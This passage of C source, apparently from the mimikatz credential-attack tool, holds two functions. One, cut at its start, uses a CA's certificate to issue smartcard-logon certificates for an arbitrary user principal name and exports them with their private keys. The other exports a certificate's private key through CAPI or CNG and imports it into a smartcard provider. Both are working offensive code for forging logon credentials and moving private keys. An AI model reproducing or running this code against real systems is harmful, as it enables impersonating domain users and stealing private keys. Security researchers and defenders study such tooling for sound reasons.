		if(kull_m_string_args_byName(argc, argv, L"upn", &ci.cn, NULL))
		{
			kprintf(L"CA store       : %s\n", szStoreCA);
			if(hCertStoreCA = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, (HCRYPTPROV_LEGACY) NULL, kull_m_crypto_system_store_to_dword(szStoreCA) | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, L"My"))
			{
				kprintf(L"CA name        : %s\n", szNameCA);
				if(pCertCtxCA = CertFindCertificateInStore(hCertStoreCA, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, CERT_FIND_SUBJECT_STR, szNameCA, NULL))
				{
					if(kuhl_m_crypto_c_sc_auth_Ext_EKU(&eku, 2, szOID_KP_SMARTCARD_LOGON, szOID_PKIX_KP_CLIENT_AUTH))
					{
						if(kuhl_m_crypto_c_sc_auth_Ext_AltUPN(&san, ci.cn))
						{
							if(kull_m_string_args_byName(argc, argv, L"crldp", &szCrlDp, NULL))
								if(kuhl_m_crypto_c_sc_auth_Ext_CDP(&cdp, 1, szCrlDp))
									ci.cdp = &cdp;

							if(generateCertificate(&ki, &ci, pCertCtxCA, NULL, &Certificate, &szCertificate, NULL))
							{
								if(kull_m_string_args_byName(argc, argv, L"pfx", &szPfx, NULL))
								{
									isExported = kull_m_crypto_DerAndKeyInfoToPfx(Certificate, szCertificate, &ki.keyInfos, szPfx);
									kprintf(L"Private Export : %s - %s\n", szPfx, isExported ? L"OK" : L"KO");
								}
								else
								{
									isExported = kull_m_crypto_DerAndKeyInfoToStore(Certificate, szCertificate, &ki.keyInfos, CERT_SYSTEM_STORE_CURRENT_USER, L"My", FALSE);
									kprintf(L"Private Store  : CERT_SYSTEM_STORE_CURRENT_USER/My - %s\n", isExported ? L"OK" : L"KO");
								}

								if(!isExported || szPfx)
									kull_m_crypto_close_hprov_delete_container(ki.hProv);
								else
									CryptReleaseContext(ki.hProv, 0);
								LocalFree(Certificate);
							}
							if(ci.cdp)
								kuhl_m_crypto_c_sc_auth_Ext_Free(ci.cdp);
							kuhl_m_crypto_c_sc_auth_Ext_Free(&san);
						}
						else PRINT_ERROR_AUTO(L"Unable to generate SAN extension - kuhl_m_crypto_c_sc_auth_Ext_AltUPN");
						kuhl_m_crypto_c_sc_auth_Ext_Free(&eku);
					}
					else PRINT_ERROR_AUTO(L"Unable to generate EKU extension - kuhl_m_crypto_c_sc_auth_Ext_EKU");
					CertFreeCertificateContext(pCertCtxCA);
				}
				else PRINT_ERROR_AUTO(L"CertFindCertificateInStore");
				CertCloseStore(hCertStoreCA, CERT_CLOSE_STORE_FORCE_FLAG);
			}
			else PRINT_ERROR_AUTO(L"CertOpenStore");
		}
		else PRINT_ERROR(L"/upn:user@domain.local needed\n");
	}
	else PRINT_ERROR(L"/caname:CA-KIWI needed\n");

	if(ki.pin)
		LocalFree(ki.pin);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_crypto_c_cert_to_hw(int argc, wchar_t * argv[])
{
	LPCWSTR szStore, szName, szPin;
	HCERTSTORE hCertStore;
	PCCERT_CONTEXT pCertCtx;
	BOOL isExported = FALSE;

	HCRYPTPROV hCapiProv;
	HCRYPTKEY hCapiKey;
	NCRYPT_PROV_HANDLE hCngProv;
	NCRYPT_KEY_HANDLE hCngKey;
	PBYTE keyblob;
	DWORD dwkeyblob;
	SECURITY_STATUS nCryptReturn;

	LPSTR aPin = NULL;
	HCRYPTPROV hProvCERT;
	HCRYPTKEY hKeyCERT;
	CRYPT_KEY_PROV_INFO *source, keyInfos = {NULL, MS_SCARD_PROV, PROV_RSA_FULL, 0, 0, NULL, 0};

	kull_m_string_args_byName(argc, argv, L"store", &szStore, L"LOCAL_MACHINE");
	if(kull_m_string_args_byName(argc, argv, L"name", &szName, NULL))
	{
		kprintf(L"Cert store     : %s\n", szStore);
		if(hCertStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, (HCRYPTPROV_LEGACY) NULL, kull_m_crypto_system_store_to_dword(szStore) | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, L"My"))
		{
			kprintf(L"Cert name      : %s\n", szName);
			if(pCertCtx = CertFindCertificateInStore(hCertStore, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, CERT_FIND_SUBJECT_STR, szName, NULL))
			{
				kprintf(L"Cert validity  : "); kull_m_string_displayLocalFileTime(&pCertCtx->pCertInfo->NotBefore);
				kprintf(L" -> "); kull_m_string_displayLocalFileTime(&pCertCtx->pCertInfo->NotAfter); kprintf(L"\n");
				if(CertGetCertificateContextProperty(pCertCtx, CERT_KEY_PROV_INFO_PROP_ID, NULL, &dwkeyblob))
				{
					if(source = (PCRYPT_KEY_PROV_INFO) LocalAlloc(LPTR, dwkeyblob))
					{
						if(CertGetCertificateContextProperty(pCertCtx, CERT_KEY_PROV_INFO_PROP_ID, source, &dwkeyblob))
						{
							keyInfos.dwKeySpec = source->dwKeySpec;
							kprintf(L"Src provider   : %s\nSrc container  : %s\n", source->pwszProvName, source->pwszContainerName);
							if(source->dwProvType)
							{
								if(CryptAcquireContext(&hCapiProv, source->pwszContainerName, source->pwszProvName, source->dwProvType, source->dwFlags))
								{
									if(CryptGetUserKey(hCapiProv, source->dwKeySpec, &hCapiKey))
									{
										if(CryptExportKey(hCapiKey, 0, PRIVATEKEYBLOB, 0, NULL, &dwkeyblob))
										{
											if(keyblob = (LPBYTE)LocalAlloc(LPTR, dwkeyblob))
											{
												if(!(isExported = CryptExportKey(hCapiKey, 0, PRIVATEKEYBLOB, 0, keyblob, &dwkeyblob)))
												{
													PRINT_ERROR_AUTO(L"CryptExportKey(data)");
													LocalFree(keyblob);
												}
											}
										}
										else PRINT_ERROR_AUTO(L"CryptExportKey(init)");
										CryptDestroyKey(hCapiKey);
									}
									else PRINT_ERROR_AUTO(L"CryptGetUserKey");
									CryptReleaseContext(hCapiProv, 0);
								}
								else PRINT_ERROR_AUTO(L"CryptAcquireContext");
							}
							else
							{
								__try
								{
									nCryptReturn = NCryptOpenStorageProvider(&hCngProv, source->pwszProvName, 0);
									if(nCryptReturn == ERROR_SUCCESS)
									{
										nCryptReturn = NCryptOpenKey(hCngProv, &hCngKey, source->pwszContainerName, 0, source->dwFlags);
										if(nCryptReturn == ERROR_SUCCESS)
										{
											nCryptReturn = NCryptExportKey(hCngKey, 0, LEGACY_RSAPRIVATE_BLOB, NULL, NULL, 0, &dwkeyblob, 0);
											if(nCryptReturn == ERROR_SUCCESS)
											{
												if(keyblob = (LPBYTE)LocalAlloc(LPTR, dwkeyblob))
												{
													nCryptReturn = NCryptExportKey(hCngKey, 0, LEGACY_RSAPRIVATE_BLOB, NULL, keyblob, dwkeyblob, &dwkeyblob, 0);
													if(!(isExported = (nCryptReturn == ERROR_SUCCESS)))
													{
														PRINT_ERROR(L"NCryptExportKey(data): %08x\n", nCryptReturn);
														LocalFree(keyblob);
													}
												}
											}
											else PRINT_ERROR(L"NCryptExportKey(init): %08x\n", nCryptReturn);
											NCryptFreeObject(hCngKey);
										}
										else PRINT_ERROR(L"NCryptOpenKey: %08x\n", nCryptReturn);
										NCryptFreeObject(hCngProv);
									}
									else PRINT_ERROR(L"NCryptOpenStorageProvider: %08x\n", nCryptReturn);
								}
								__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
								{
									PRINT_ERROR(L"No CNG?\n");
								}
							}
						}
						LocalFree(source);
					}
				}
				
				if(isExported)
				{
					kull_m_string_args_byName(argc, argv, L"csp", &keyInfos.pwszProvName, MS_SCARD_PROV);
					if(keyInfos.pwszContainerName = kull_m_string_getRandomGUID())
					{
						kprintf(L"Dst provider   : %s\nDst container  : %s\n", keyInfos.pwszProvName, keyInfos.pwszContainerName);
						if(kull_m_string_args_byName(argc, argv, L"pin", &szPin, NULL))
						{
							if(aPin = kull_m_string_unicode_to_ansi(szPin))
							{
								if(CryptAcquireContext(&hProvCERT, NULL, keyInfos.pwszProvName, keyInfos.dwProvType, ((MIMIKATZ_NT_MAJOR_VERSION > 5) ? CRYPT_DEFAULT_CONTAINER_OPTIONAL : 0)))
								{
									if(CryptSetProvParam(hProvCERT, PP_KEYEXCHANGE_PIN, (const BYTE *) aPin, 0))
										keyInfos.dwFlags = CRYPT_SILENT;
									else
									{
										keyInfos.dwFlags = 0;
										PRINT_ERROR_AUTO(L"CryptSetProvParam(PP_KEYEXCHANGE_PIN)");
									}
									CryptReleaseContext(hProvCERT, 0);
								}
								else PRINT_ERROR_AUTO(L"CryptAcquireContext(pin)");
							}
						}

						if(CryptAcquireContext(&hProvCERT, keyInfos.pwszContainerName, keyInfos.pwszProvName, keyInfos.dwProvType, CRYPT_NEWKEYSET | keyInfos.dwFlags))
						{
							if(aPin)
							{
								if(!CryptSetProvParam(hProvCERT, PP_KEYEXCHANGE_PIN, (const BYTE *) aPin, 0))
									PRINT_ERROR_AUTO(L"CryptSetProvParam(PP_KEYEXCHANGE_PIN)");
								LocalFree(aPin);
							}
							kprintf(L"Dst Key Import : ");
							if(CryptImportKey(hProvCERT, keyblob, dwkeyblob, 0, 0, &hKeyCERT))
							{
								kprintf(L"OK\nDst Cert Assoc : ");
								if(isExported = CryptSetKeyParam(hKeyCERT, KP_CERTIFICATE, pCertCtx->pbCertEncoded, 0))
									kprintf(L"OK\n");
								else PRINT_ERROR_AUTO(L"CryptSetKeyParam");
								CryptDestroyKey(hKeyCERT);
							}
							else PRINT_ERROR_AUTO(L"CryptImportKey");
						}
						else PRINT_ERROR_AUTO(L"CryptAcquireContext");
						LocalFree(keyInfos.pwszContainerName);
					}
					LocalFree(keyblob);
				}
				CertFreeCertificateContext(pCertCtx);
			}
			else PRINT_ERROR_AUTO(L"CertFindCertificateInStore");
			CertCloseStore(hCertStore, CERT_CLOSE_STORE_FORCE_FLAG);
		}
		else PRINT_ERROR_AUTO(L"CertOpenStore");
	}
	else PRINT_ERROR(L"/name:kiwi needed\n");

	return STATUS_SUCCESS;
}